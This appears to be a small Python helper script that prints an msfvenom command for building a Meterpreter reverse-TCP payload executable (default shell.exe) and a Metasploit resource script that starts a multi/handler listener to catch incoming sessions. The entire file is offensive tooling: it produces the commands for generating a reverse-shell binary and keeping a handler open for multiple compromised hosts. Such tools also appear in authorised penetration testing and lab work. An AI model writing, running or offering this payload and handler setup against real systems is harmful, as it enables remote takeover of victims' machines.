import sys

def generate_msfvenom(payload, lhost, lport, format="exe", output="shell.exe"):
    return f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output}"

def generate_handler_rc(payload, lhost, lport):
    return f"""# Metasploit Resource Script for Reverse Handler
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python msf_helper.py <mode> <lhost> <lport> [payload] [format] [output]")
        print("Modes: venom, handler")
        print("Example: python msf_helper.py venom 192.168.1.50 4444 windows/x64/meterpreter/reverse_tcp exe shell.exe")
    else:
        mode = sys.argv[1].lower()
        lhost = sys.argv[2]
        lport = sys.argv[3]
        payload = sys.argv[4] if len(sys.argv) > 4 else "windows/x64/meterpreter/reverse_tcp"
        
        if mode == "venom":
            fmt = sys.argv[5] if len(sys.argv) > 5 else "exe"
            out = sys.argv[6] if len(sys.argv) > 6 else f"shell.{fmt}"
            print(generate_msfvenom(payload, lhost, lport, fmt, out))
        elif mode == "handler":
            print(generate_handler_rc(payload, lhost, lport))
        else:
            print(f"Unknown mode: {mode}")
